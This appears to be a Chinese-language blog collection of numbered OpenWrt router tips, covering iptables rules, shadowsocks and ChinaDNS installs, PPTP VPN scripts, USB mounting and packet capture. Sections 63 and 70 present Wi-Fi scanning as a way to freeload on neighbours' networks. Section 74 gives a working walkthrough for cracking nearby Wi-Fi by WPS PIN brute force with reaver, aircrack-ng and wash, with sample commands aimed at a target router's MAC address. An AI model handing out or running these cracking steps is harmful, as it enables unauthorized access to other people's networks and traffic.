ACCEPT all — 0.0.0.0/0 0.0.0.0/0 ctstate RELATED,ESTABLISHED
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
input_rule all — 0.0.0.0/0 0.0.0.0/0
input all — 0.0.0.0/0 0.0.0.0/0

Chain FORWARD (policy DROP)
target prot opt source destination
bw_ingress all — 0.0.0.0/0 0.0.0.0/0
ingress_restrictions all — 0.0.0.0/0 0.0.0.0/0
egress_restrictions all — 0.0.0.0/0 0.0.0.0/0
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
ACCEPT all — 0.0.0.0/0 0.0.0.0/0 ctstate RELATED,ESTABLISHED
forwarding_rule all — 0.0.0.0/0 0.0.0.0/0
forward all — 0.0.0.0/0 0.0.0.0/0
reject all — 0.0.0.0/0 0.0.0.0/0

Chain OUTPUT (policy ACCEPT)
target prot opt source destination
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
ACCEPT all — 0.0.0.0/0 0.0.0.0/0 ctstate RELATED,ESTABLISHED
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
output_rule all — 0.0.0.0/0 0.0.0.0/0
output all — 0.0.0.0/0 0.0.0.0/0

Chain bw_ingress (2 references)
target prot opt source destination
all — 0.0.0.0/0 0.0.0.0/0 bandwidth –id total1-download-2-449 –type combined –current_bandwidth 0 –reset_interval 2 –reset_time 2 –intervals_to_save 449
all — 0.0.0.0/0 0.0.0.0/0 match-set local_addr_set dst bandwidth –id bdist1-download-minute-15 –type individual_dst –reset_interval minute –intervals_to_save 15
all — 0.0.0.0/0 0.0.0.0/0 bandwidth –id total2-download-minute-359 –type combined –current_bandwidth 0 –reset_interval minute –intervals_to_save 359
all — 0.0.0.0/0 0.0.0.0/0 match-set local_addr_set dst bandwidth –id bdist2-download-900-24 –type individual_dst –reset_interval 900 –reset_time 900 –intervals_to_save 24
all — 0.0.0.0/0 0.0.0.0/0 bandwidth –id total3-download-180-479 –type combined –current_bandwidth 0 –reset_interval 180 –reset_time 180 –intervals_to_save 479
all — 0.0.0.0/0 0.0.0.0/0 match-set local_addr_set dst bandwidth –id bdist3-download-hour-24 –type individual_dst –reset_interval hour –intervals_to_save 24
all — 0.0.0.0/0 0.0.0.0/0 bandwidth –id total4-download-7200-359 –type combined –current_bandwidth 0 –reset_interval 7200 –reset_time 7200 –intervals_to_save 359
all — 0.0.0.0/0 0.0.0.0/0 match-set local_addr_set dst bandwidth –id bdist4-download-day-31 –type individual_dst –reset_interval day –intervals_to_save 31
all — 0.0.0.0/0 0.0.0.0/0 bandwidth –id total5-download-day-365 –type combined –current_bandwidth 0 –reset_interval day –intervals_to_save 365
all — 0.0.0.0/0 0.0.0.0/0 match-set local_addr_set dst bandwidth –id bdist5-download-month-12 –type individual_dst –reset_interval month –intervals_to_save 12

Chain egress_restrictions (1 references)
target prot opt source destination
egress_whitelist all — 0.0.0.0/0 0.0.0.0/0

Chain egress_whitelist (1 references)
target prot opt source destination

Chain forward (1 references)
target prot opt source destination

Chain forwarding_rule (1 references)
target prot opt source destination

Chain ingress_restrictions (1 references)
target prot opt source destination
ingress_whitelist all — 0.0.0.0/0 0.0.0.0/0

Chain ingress_whitelist (1 references)
target prot opt source destination

Chain input (1 references)
target prot opt source destination

Chain input_rule (1 references)
target prot opt source destination

Chain output (1 references)
target prot opt source destination

Chain output_rule (1 references)
target prot opt source destination

Chain pf_loopback_B (0 references)
target prot opt source destination

Chain reject (1 references)
target prot opt source destination
REJECT tcp — 0.0.0.0/0 0.0.0.0/0 reject-with tcp-reset
REJECT all — 0.0.0.0/0 0.0.0.0/0 reject-with icmp-port-unreachable

——————————————————————————————————-
上面的显示结果，是不是看着就有点懵了！建议直接清空好了，完全可以根据自己的需要重新配置iptables，可满足一般用户需求。
下面我们来一步一步设置，完全根据自身需要进行定制。

root@myopenwrt:~#vi /etc/firewall.user
用户自定义的防火墙规则可以存在/etc/firewall.user文件中，实际就是iptables具体的设置命令。

##首先清空系统默认规则（filter表）
iptables -F #删除所有规则链中的所有规则
iptables -X #删除用户自定义规则链
iptables -Z #计数清零

#设置各规则链的默认策略。
iptables -P INPUT   DROP
iptables -P OUTPUT  ACCEPT
iptables -P FORWARD DROP

iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -i br-lan -j ACCEPT
iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT

iptables -A FORWARD -i br-lan -o pppoe-wan  -j ACCEPT
iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT
#iptables -A FORWARD -p tcp –dport 10080 -j ACCEPT
#iptables -A FORWARD -p udp –dport 10080 -j ACCEPT

##清空系统默认规则（nat表）
iptables -t nat -F
iptables -t nat -X
iptables -t nat -Z

iptables -t nat -P PREROUTING  ACCEPT
iptables -t nat -P POSTROUTING ACCEPT
iptables -t nat -P OUTPUT      ACCEPT

##pppoe拨号网络支持nat
iptables -t nat -A POSTROUTING -i br-lan -o pppoe-wan -j MASQUERADE
#iptables -t nat -A PREROUTING -p tcp  –dport 10080  -j DNAT –to-destination 10.10.7.2
#iptables -t nat -A PREROUTING -p udp  –dport 10080  -j DNAT –to-destination 10.10.7.3

##清空系统默认规则（mangle表）
#iptables -t mangle -F
#iptables -t mangle -X
#iptables -t mangle -Z
#iptables -t mangle -A PREROUTING  -i pppoe-wan -j TTL –ttl-inc 1
#iptables -t mangle -A POSTROUTING -o pppoe-wan -j TTL –ttl-set 128
#iptables -t mangle -A POSTROUTING -o pppoe-wan -j IPID –ipid-pace 1
#iptables -I FORWARD -p tcp –tcp-flags RST RST -j DROP

----------------------------------------------------------------------------------------------------------------
51、OpenWrt路由器Software 更新/路径/目录地址 【OpenWrt】

-------------------------------------------------------------------------------------------------------------------------------
Netgear
-------------------------------------------------------------------------------------------------------------------------------
dest root /
dest ram /tmp
lists_dir ext /var/opkg-lists
option overlay_root /overlay
src/gz barrier_breaker_base http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/base
src/gz barrier_breaker_luci http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/luci
src/gz barrier_breaker_packages http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/packages
src/gz barrier_breaker_routing http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/routing
src/gz barrier_breaker_telephony http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/telephony
src/gz barrier_breaker_management http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/management
src/gz barrier_breaker_oldpackages http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/oldpackages
-------------------------------------------------------------------------------------------------------------------------------
TL_720N
-------------------------------------------------------------------------------------------------------------------------------
dest root /
dest ram /tmp
lists_dir ext /var/opkg-lists
option overlay_root /overlay
src/gz barrier_breaker_base http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/base
src/gz barrier_breaker_luci http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/Luci
src/gz barrier_breaker_packages http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/packages
src/gz barrier_breaker_routing http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/routing
src/gz barrier_breaker_telephony http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/telephony
src/gz barrier_breaker_management http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/management

----------------------------------------------------------------------------------------------------------------
52、解决GMAIL实时推送通知及GVOICE通话等问题，以及IMAP/POP接发：

POP/IMAP/SMTP 108和109结尾
74.125.136.109 pop.gmail.com  #995  SSL
74.125.136.108 imap.gmail.com  #993  SSL
64.233.181.108 smtp.gmail.com  #465  SSL
173.194.65.109 smtp.gmail.com  #587  TLS

64.233.168.188 mtalk.google.com  #5228/5229/5230端口 与GCM推送有关 
64.233.161.125 talk.google.com  #5222端口 环聊GVOICE拨出电话用
173.194.73.127 talkr.l.google.com  #19305-19309端口 环聊通话有关
173.194.65.127 sun.l.google.com  #19305-19309端口 环聊通话有关

【注】Google 特俗服务端口IP都可以通用，只需检测结尾IP段。
----------------------------------------------------------------------------------------------------------------
53、OpenWrt自动下载更新文件的命令 【OpenWrt】

ignore.list的定期更新，可以使用下面的命令：

wget -O- 'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest' | awk -F\| '/CN\|ipv4/ { printf("%s/%d\n", $4, 32-log($5)/log(2)) }' > /etc/shadowsocks/ignore.list

或者：

curl 'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest' | awk -F\| '/CN\|ipv4/ { printf("%s/%d\n", $4, 32-log($5)/log(2)) }' > /etc/shadowsocks/ignore.list
----------------------------------------------------------------------------------------------------------------
54、shadowsocks 安装教程 【OpenWrt】

首次安装的话，先安装必要的包，确保路由器联网，先更新软件包列表（下载有问题的请手动到openwrt.org下载所有需要的包并上传到路由器上使用opkg install XXX.ipk命令安装）：

$ opkg update

shadowsocks有openssl（文件名是shadowsocks-libev-spec-X.XX.ipk）和polarssl（文件名是shadowsocks-libev-spec-polarssl-X.XX.ipk）两个版本选择，ROM空间吃紧的就选择后者吧。


先安装必要的包，如果要用polarssl版本的shadowsocks（polarssl体积更小）：
$ opkg install ipset libpolarssl resolveip

如果要用普通版本（openssl）的shadowsocks，那么(openssl兼容性更好)：
$ opkg install ipset libopenssl resolveip


期间可能会遇到类似以下的错误提示：
kmod: failed to insert /lib/modules/3.10.44/ip_set.ko
kmod: failed to insert /lib/modules/3.10.44/ip_set_bitmap_ip.ko
kmod: failed to insert /lib/modules/3.10.44/ip_set_bitmap_ipmac.ko
...

没关系，这时因为安装ipset包后需要重启，我们此时先重启一次路由器。

然后下载下面四个包，前两个ipk包需要根据自己CPU型号选择：

下载链接
shadowsocks-spec: http://sourceforge.net/projects/openwrt-dist/files/shadowsocks-libev/
chinadns-openwrt: http://sourceforge.net/projects/openwrt-dist/files/chinadns/
luci-app-shadowsocks: http://sourceforge.net/projects/openwrt-dist/files/luci-app/shadowsocks-spec/
luci-app-chinadns: http://sourceforge.net/projects/openwrt-dist/files/luci-app/chinadns/ 

接着将下载的包通过WinSCP之类的工具上传至路由器的/tmp目录。

接着安装shadowsocks和chinadns，一步步执行：
$ cd /tmp
$ opkg install shadowsocks-libev-spec_x.x.x-x_ar71xx.ipk
$ opkg install ChinaDNS_x.x.x-x_ar71xx.ipk
$ opkg install luci-app-chinadns_x.x.x-x_all.ipk
$ opkg install luci-app-shadowsocks-spec_x.x.x-x_all.ipk

特别提醒：2015.1.8，由于ChinaDNS-C更名为ChinaDNS，所以包名有变化，此前安装过ChinaDNS-C的，需要手动卸载并重新安装新版。

安装完成后，shadowsocks和chinadns应该会被配置成开机启动，如果发现没有生效，运行：

$ /etc/init.d/shadowsocks enable
$ /etc/init.d/chinadns enable

----------------------------------------------------------------------------------------------------------------
55、CentOS 下一键安装 VPN PPTP

CentOS下安装 VPN"傻瓜教程"。
PPTP协议，VPS安装VPN 10分钟即可完成。
每月只需要5刀。（最便宜的VPS）


简易 教程：
1.购买VPS，最好是CentOS5 系统的 有一键安装包。

2.用Putty(如果是windows用户）连上你的VPS。

3.然后输入：
wget http://www.diahosting.com/dload/pptpd.sh
回车。等待下载完成！

4.再输入：
sh pptpd.sh
5.等待输入完成。出来的最后一行就包含你的VPN帐号，和密码.（协议PPTP ）


6.如果要编辑帐号 ，添加其他帐号。
vi etc/ppp/chap-secrets
然后安装上面的格式编辑即可！

----------------------------------------------------------------------------------------------------------------
56、TP-LINK TTL 刷 UBOOT

用TTL如何刷UBOOT，命令是什么？？

这个在 hackpascal的uboot帖子里有

8M的

刷编程器固件：
tftp 0x80000000 full.bin
erase 0x9f000000 +0x800000
cp.b 0x80000000 0x9f000000 0x800000

刷uboot：
tftp 0x80000000 uboot.bin
erase 0x9f000000 +0x20000
cp.b 0x80000000 0x9f000000 0x20000

刷fw：
tftp 0x80000000 fw.bin
erase 0x9f020000 +0x7c0000
cp.b 0x80000000 0x9f020000 0x7c0000

刷art:
tftp 0x80000000 art.bin
erase 0x9f7f0000 +0x10000
cp.b 0x80000000 0x9f7f0000 0x10000

----------------------------------------------------------------------------------------------------------------
57、OpenWrt安装stat命令的方法

$ opkg update
$ opkg install coreutils-stat

----------------------------------------------------------------------------------------------------------------
58、搬瓦工bandwagonhost.com centos下一键安装VPN

  下载 centos 6 一键安装包
$ wget --no-check-certificate https://raw.githubusercontent.com/teddysun/across/master/pptp.sh

  给予权限
$ chmod +x pptp.sh

  即可运行VPN一键安装包：
$ ./pptp.sh

  增加一个新用户，删除用户，修改密码等可以使用编辑：
$ vi /etc/ppp/chap-secrets

键盘选择插入键：Insert 进行编辑， 使用键盘上下左右将光标插入另一行按照以下格式输入
vpn pptpd Xk0jk78f *

注释：vpn  用户名
Xk0jk78f   密码
pptpd 和 * 不变，字符中间必须用一个空格隔开。数字123，选用键盘字母键上方，不要用数字小键盘
----------------------------------------------------------------------------------------------------------------
59、DIR505路由器安装 shadowsocks 和 chinadns

1、首先编辑opkg.conf文件，添加一个shadowsocks官方软件更新源

$ vi /etc/opkg.conf

在文件末尾添加如下内容：
src/gz openwrt_dist http://openwrt-dist.sourceforge.net/releases/ar71xx/packages
src/gz openwrt_dist_luci http://openwrt-dist.sourceforge.net/releases/luci/packages

2、然后依次运行以下命令

$ opkg update
$ opkg install ChinaDNS
$ opkg install luci-app-chinadns
$ opkg install shadowsocks-libev-spec
$ opkg install luci-app-shadowsocks-spec


3、最后，登陆路由器web管理平台，去配置好参数，就可以科学上网了，爽歪歪吧~

如果downloads.openwrt.org已经被墙了，就先执行

$ opkg install http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/base/resolveip_2_ar71xx.ipk

然后opkg update 以及后续的操作


----------------------------------------------------------------------------------------------------------------
60、强制删除ipk, 强制删除openwrt程序,强制删除安装包，强制删除 OpenWrt 安装包

$ opkg remove ChinaDNS --force-remove
----------------------------------------------------------------------------------------------------------------
61、OpenWrt定时重启与时间效正

OPENWRT定时重启：进入WEB页-system-scheduled tasks 在下面的方框中输入命令：

20 6 * * * reboot /每天6：20 重启路由。

时间效正：WEB页中无自定义时间项。ssh进入路由后使用命令：

$ date -s 3/12/2012
$ date -s 12:32:00

即可完成设置.
----------------------------------------------------------------------------------------------------------------
62、OpenWrt设置DNS服务器

在文件/etc/config/dhcp应该有一段是这样子的：
config 'dhcp' 'lan'
        option 'interface' 'lan'
        option 'start' '100'
        option 'limit' '150'
        option 'leasetime' '12h'
        list 'dhcp_option' '6,114.114.114.114,8.8.4.4'

这里的6是指dns 服务器，这个数字代码的含义可以用dnsmasq --help dhcp命令查询。
 
添加：      list dhcp_option '6,114.114.114.114,8.8.4.4'
参考资料：
https://forum.openwrt.org/viewtopic.php?id=22624
----------------------------------------------------------------------------------------------------------------
63、OpenWrt 命令查看无线路由器SSID和wireless scan 信息

#统计每个信道的AP数量：#这个可以避免使用AP数量过多的信道，防止干扰，可以提升蹭网的环境
iw wlan0 scan | grep 'primary channel' | awk '{a[$5]++}END{for (j in a){print j,a[j]}}' | awk '{printf " Channle:%d Total:%d \n",$1,$2}'

#打印当前扫描到的所有SSID：
iw wlan0 scan | grep SSID | awk '{print $2}'

#查找特定的SSID：
#因为这里有几个路由器信号特别好，但是东家手比较贱，经常关路由器，所以写了个自动查询SSID存活的脚本，可以到 192xxx/wlan.html下面参看 东家的SSID是否已经广播出来了
#至于自动切换的脚本目前在写
iw wlan0 scan | grep SSID | awk '{print $2}'| grep xxxx >> /www/wlan.html
#xxx就是目标ssid的名称 
----------------------------------------------------------------------------------------------------------------
64、OpenWRT抓包/路由器抓包/TCPDUMP抓包

前言：

做路由器开发，难免会遇到抓包的情况，但是抓包需要有Hub或者无线抓包网卡，调试无线问题，且目前手中没有无线抓包网卡，怎么办？那不能分析无线连接建立的过程，我们就来分析下，其传输的数据，肯定是从ra0无线接口来进行了。


准备：

编译tcpdump.ipk， libpcap.ipk并且安装到OpenWRT系统中。

可选传输方式scp, wget等。

wget http://<web server>/target_file

opkg install <package_name>.ipk


抓包：

tcpdump tcp -i ra0 -s 0 -c 10000 and dst port ! 22 -w ./target2.cap

1)tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型 
(2)-i eth1 : 只抓经过接口eth1的包 
(3)-t : 不显示时间戳 
(4)-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包 
(5)-c 100 : 只抓取100个数据包 
(6)dst port ! 22 : 不抓取目标端口是22的数据包 
(7)src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24 
(8)-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析 


分析数据：

通过WINSCP/scp/samba等方式把文件取出， 用wireshark分析。
----------------------------------------------------------------------------------------------------------------
65、如何在OPENWRT中禁止某个MAC地址上网

设置iptables，SSH登录到路由器，在终端执行：

$ iptables -A INPUT -p tcp -m mac --mac-source xx:xx:xx:xx:xx:xx --dport 80 -j DROP

----------------------------------------------------------------------------------------------------------------
66、OpenWrt安装STAT命令:

$ opkg update
$ opkg install coreutils-stat

----------------------------------------------------------------------------------------------------------------
67、OpenWrt支持的命令

OpenWrt 内核系 BusyBox，其支持的命令包括：

        arping, ash, awk, basename, brctl, bunzip2, bzcat, cat, chgrp,
        chmod, chown, chroot, clear, cmp, cp, crond, crontab, cut, date, dd,
        df, dirname, dmesg, du, echo, egrep, env, expr, false, fgrep, find,
        free, fsync, grep, gunzip, gzip, halt, head, hexdump, hostid, hwclock,
        id, ifconfig, init, insmod, kill, killall, klogd, less, ln, lock,
        logger, logread, ls, lsmod, md5sum, mkdir, mkfifo, mknod, mkswap,
        mktemp, mount, mv, nc, netmsg, netstat, nice, nslookup, ntpd, passwd,
        pgrep, pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd,
        readlink, reboot, reset, rm, rmdir, rmmod, route, sed, seq, sh, sleep,
        sort, start-stop-daemon, strings, swapoff, swapon, switch_root, sync,
        sysctl, syslogd, tail, tar, tee, telnet, telnetd, test, time, top,
        touch, tr, traceroute, true, udhcpc, umount, uname, uniq, uptime,
        vconfig, vi, watchdog, wc, wget, which, xargs, yes, zcat

----------------------------------------------------------------------------------------------------------------
68、OpenWrt挂载U盘和硬盘，并实现网络共享的方法

$ opkg update
$ opkg install kmod-usb-core
$ opkg install kmod-usb2                #安装usb2.0 
$ opkg install kmod-usb-ohci            #安装usb ohci控制器驱动
$ opkg install kmod-usb-storage         #安装usb存储设备驱动
$ opkg install kmod-fs-ext3             #安装ext3分区格式支持组件
$ opkg install kmod-fs-vfat             #挂载FAT
$ opkg install ntfs-3g                  #挂载NTFS
$ opkg install mount-utils              #挂载卸载工具
$ opkg install block-mount
$ opkg install luci-app-samba           #SAMBA网络共享服务
$ /etc/init.d/samba enable              #启用并开始SAMBA共享
$ /etc/init.d/samba restart


重启路由器 登陆路由器设置界面 可以看到多了挂载点和网络共享两个选项（也可全部做完再重启）

打开/etc/hotplug.d/block/10-mount文件(如果不存在请新建)
修改为如下内容

#!/bin/sh
 
# Copyright (C) 2009 OpenWrt.org  (C) 2010 OpenWrt.org.cn
 
blkdev=`dirname $DEVPATH`
if [ `basename $blkdev` != "block" ]; then
 
    device=`basename $DEVPATH`
    case "$ACTION" in
        add)
                mkdir -p /mnt/$device
                # vfat & ntfs-3g check
                if  [ `which fdisk` ]; then
                        isntfs=`fdisk -l | grep $device | grep NTFS`
                        isvfat=`fdisk -l | grep $device | grep FAT`
                        isfuse=`lsmod | grep fuse`
                        isntfs3g=`which ntfs-3g`
                else
                        isntfs=""
                        isvfat=""
                fi 
 
                # mount with ntfs-3g if possible, else with default mount
                if [ "$isntfs" -a "$isfuse" -a "$isntfs3g" ]; then
                        ntfs-3g -o nls=utf8 /dev/$device /mnt/$device
                elif [ "$isvfat" ]; then
                        mount -t vfat -o iocharset=utf8,rw,sync,umask=0000,dmask=0000,fmask=0000 /dev/$device /mnt/$device
                else
                        mount /dev/$device /mnt/$device
                fi
  if [ -f /dev/${device}/swapfile ]; then
   mkswap /dev/${device}/swapfile
   swapon /dev/${device}/swapfile
  fi
                ;;
        remove)
  if [ -f /dev/${device}/swapfile ]; then
   swapoff /dev/${device}/swapfile
  fi
                umount /dev/$device
                ;;
    esac
 
fi


插入U盘或移动硬盘 再次重启路由器 在挂载点中就可以看到已经挂载的设备
如果U盘只有一个分区，就是/mnt/sda1，第二个分区是/mnt/sda2
如果用Hub接入多个U盘，第二个设备就是/mnt/sdb，以此类推

进入网络共享中，添加共享目录例如/mnt/sda1，权限为777(即完全访问)。
至此就可以在网上邻居中看到路由器的这个共享文件夹了。

注意XP系统 必须保证
Computer Browser
Server
Application Layer Gatway Service
Windows Firewall/Internet Connection Sharing
这几个服务开启 并且在本地连接属性中
Microsoft 网络的文件和打印机共享
启用时 网上邻居文件才可以访问

----------------------------------------------------------------------------------------------------------------
69、路由器更换网关或者停用DHCP/禁用DHCP后如何找到网关/找到路由器网关/找出路由器网关

1.命令行模式下运行：

arp -a

网关会向全子网发送广播报文
用这个命令应该可以找到

2.连网段都改了，也没有开DHCP
你可以试试把你的掩码设小一些。比如原来掩码是255.255.255.0改成255.255.0.0。
在cmd里输入：
#清空arp缓存

$ arp -d

#ping 192.168.x.x的所有ip，并把有回应的记录在findip.txt文本文件中。

$ for /l %i in (0,1,254) do (for /l %j in (1,1,254) do ping 192.168.%i.%j -n 1 -l 16 -w 1 |find "Reply" >>findip.txt)

#有些有防火墙禁止ping回应的可以在arp缓存里找。不过arp缓存有时间限制，等全部ping完，前面的就被清除了。你可以把上面ip范围缩小，每ping 100个就记录一下。不然，不完全。

$ arp -a >>findmac.txt

查找一下findip.txt和findmac.txt文件，TTL=64的可能是路由器，TTL=128的可能是windows系统主机。或者一般网管喜欢把路由器设到某个网段第1个IP，如192.168.100.1

3.用IP 扫描软件 即可获得主机名字，然后你懂得

4.用局域网查看工具扫一下网内的计算机就行了

5.用Wireshark工具扫描一下数据包，网关会发出很多ARP数据包

----------------------------------------------------------------------------------------------------------------
70、OpenWrt扫描路由器命令，扫描AP命令，SCAN WIFI/WIFI SCAN命令

1.使用iw命令

$ iw wlan0 scan
  BSS 6c:e8:73:b1:45:86(on wlan0)
        TSF: 6900919239 usec (0d, 01:55:00)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortPreamble SpectrumMgmt ShortSlotTime (0x0531)
        signal: -33.00 dBm
        last seen: 1220 ms ago
        Information elements from Probe Response frame:
        SSID: wr_znjj
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        Country: US     Environment: Indoor/Outdoor
                Channels [1 - 13] @ 20 dBm
        Power constraint: 0 dB
        ERP: <no flags>
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Extended supported rates: 24.0 36.0 48.0 54.0 
        HT capabilities:
                Capabilities: 0x106e
                        HT20/HT40
                        SM Power Save disabled
                        RX HT20 SGI
                        RX HT40 SGI
                        No RX STBC
                        Max AMSDU length: 3839 bytes
                        DSSS/CCK HT40
                Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
                Minimum RX AMPDU time spacing: No restriction (0x00)
                HT RX MCS rate indexes supported: 0-15
                HT TX MCS rate indexes are undefined
        HT operation:
                 * primary channel: 1
                 * secondary channel offset: above
                 * STA channel width: any
                 * RIFS: 1
                 * HT protection: 20 MHz
                 * non-GF present: 1
                 * OBSS non-GF present: 0
                 * dual beacon: 0
                 * dual CTS protection: 0
                 * STBC beacon: 0
                 * L-SIG TXOP Prot: 0
                 * PCO active: 0
                 * PCO phase: 0
        WPA:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
        WMM:     * Parameter version 1
                 * u-APSD
                 * BE: CW 15-1023, AIFSN 3
                 * BK: CW 15-1023, AIFSN 7
                 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
                 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 00000000-0000-1000-0000-6ce873b14586
                 * Manufacturer: TP-LINK
                 * Model: TL-WR740N
                 * Model Number: 1.0
                 * Serial Number: 1.0
                 * Primary Device Type: 6-0050f204-1
                 * Device name: Wireless Router TL-WR740N
                 * Config methods: Ethernet, Label, PBC
                 * RF Bands: 0x1

2.Openwrt蹭网必备

#统计每个信道的AP数量：#这个可以避免使用AP数量过多的信道，防止干扰，可以提升蹭网的环境
iw wlan0 scan | grep 'primary channel' | awk '{a[$5]++}END{for (j in a){print j,a[j]}}' | awk '{printf " Channle:%d Total:%d \n",$1,$2}'

#打印当前扫描到的所有SSID：
iw wlan0 scan | grep SSID | awk '{print $2}'

#查找特定的SSID：
#因为这里有几个路由器信号特别好，但是东家手比较贱，经常关路由器，所以写了个自动查询SSID存活的脚本，可以到 192xxx/wlan.html下面参看 东家的SSID是否已经广播出来了
#至于自动切换的脚本目前在写
iw wlan0 scan | grep SSID | awk '{print $2}'| grep xxxx >> /www/wlan.html
#xxx就是目标ssid的名称 

引自： http://e2dick.com/index.php/archives/30/
另外我希望有人能把 第一条统计信道的功能 做成LUCI界面

----------------------------------------------------------------------------------------------------------------
71、OpenWrt的mount命令挂载移动硬盘的方法

$ mount -t ntfs-3g /dev/sda2 /mnt/sda2 -o rw,sync

如需自动挂载多分区的移动硬盘sda1/sda2/sda3/sda4，需输入命令:

$ block detect > /etc/config/fstab

并编辑fstab文件如下：

$ vi /etc/config/fstab

config 'global'
        option  anon_swap       '0'
        option  anon_mount      '0'
        option  auto_swap       '1'
        option  auto_mount      '1'
        option  delay_root      '5'
        option  check_fs        '0'

config 'mount'
        option target   '/mnt/sda'
        option uuid     'beb33a09-e6a9-40d4-891e-b09535104572'
        option enabled  '0'

config 'mount'
        option target   '/mnt/sda1'
        option uuid     'beb33a09-e6a9-40d4-891e-b09535104572'
        option fstype   'ext4'
        option options  'rw,sync'
        option enabled  '1'

config 'swap'
        option  device  '/dev/sda2'

config 'swap'
        option  label 'swap'

===========================================
# a pivot overlay device (ext4) for extroot
config 'mount'
        option  target  '/overlay'
        option  uuid    '998d4bfc-81b5-469a-be2a-999ed2b81d88'

# and a data partition (vfat)
config 'mount'
        option  target  '/data'
        option  uuid    'e10e-6812'
==========================================

再开机自动运行

$ /etc/init.d/fstab enable

----------------------------------------------------------------------------------------------------------------
72、用OpenWrt断点续传下载东西，命令wget

$ wget -O /mnt/sda1/name -c -t 100 http://www.xxx.com/files

----------------------------------------------------------------------------------------------------------------
73、OpenWRT挂载3070网卡 RT3070网卡 USB 3070无线网卡
RT3070 USB无线网卡挂载需要自己手动添加的组件和驱动如下：


添加的组件：
kmod-usb-ohci kmod-usb-storage kmod-usb-wdm kmod-usb2


无线驱动：
kmod-rt2800-pci kmod-rt2800-soc kmod-rt2800-usb


编译后生成固件烧录到路由器(USB网卡已经插好)，重启后到管理界面就可以看到无线有两个。

注意事项：
1. 网上很多教程说要手动更改某个wireless文件配置，这完全没有必要，只要你的网卡驱动组件安装正常，会自动生成的；
2. 没有叫更改的地方全部默认，请不要更改，否则产生莫名其妙的问题很难解决了

----------------------------------------------------------------------------------------------------------------
74、OpenWrt安装reaver 和 aircrack–ng 和 screen 可WIFI破解和PIN

$ opkg update
$ opkg install aircrack–ng
$ opkg install screen
$ opkg install http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/packages/oldpackages/reaver_r113-1_ar71xx.ipk

安装成功后由于libpcap版本的问题会出现无法使用 $ wash –i mon0 –C 命令查看可PIN的WIFI信息，主要是libpcap版本过高，需降级！
执行以下命令对libpcap版本降到1.1.1版本：

$ mkdir –p /tmp/libpcap
$ wget –t9 –T5 http://downloads.openwrt.org/attitude_adjustment/12.09-beta/ar71xx/generic/packages/libpcap_1.1.1-2_ar71xx.ipk -O /tmp/libpcap/lib.tar.gz
$ tar –xzvf /tmp/libpcap/lib.tar.gz –C /tmp/libpcap
$ tar –xzvf /tmp/libpcap/data.tar.gz –C /tmp/libpcap
$ rm –rf /usr/lib/libpcap.so*
$ cp /tmp/libpcap/usr/lib/libpcap.so.1.1.1 /usr/lib/libpcap.so.1.3.0
$ ln –s /usr/lib/libpcap.so.1.3.0 /usr/lib/libpcap.so.1.3
$ ln –s /usr/lib/libpcap.so.1.3.0 /usr/lib/libpcap.so

成功后，开始使用reaver破解。

首先查看网卡硬件设备，使用 $ airmon-ng 命令

$ airmon-ng

Interface        Chipset             Driver

Wlan0            Atheros AR9330      ath9k  -  [phy0]

然后启用网卡(wlan0)的监控模式：

$ airmon–ng start wlan0

接下来我们扫描下附近都有些什么wifi…

$ airodump–ng mon0

用wash命令看看哪些wifi支持pin破解

$ wash –i mon0 –C

用reaver尝试pin设备Mac

$ reaver -i mon0 -b MAC -a -S -vv

使用实例

假设目标路由MAC是00:90:4C:C1:AC:21，信道为6，名字为TPLINK-0A9F，监控接口是mon0

普通用法

$ reaver –i mon0 –a –S –v –b 00:90:4C:C1:AC:21

或

$ reaver –i mon0 –c 6 –e TPLINK–0A9F –S –v –b 00:90:4C:C1:AC:21

推荐用法：

$ reaver –i mon0 –a –v –S –x 20 –r 100:10 –l 300 –b 00:90:4C:C1:AC:21
 
当信号好到爆表的时候，加个不延迟参数：

–d 0

信号非常好的时候，只要0.5延迟：

–d 0.5 –t 0.5

信号很差的时候……

–d 2 –t 2 –N

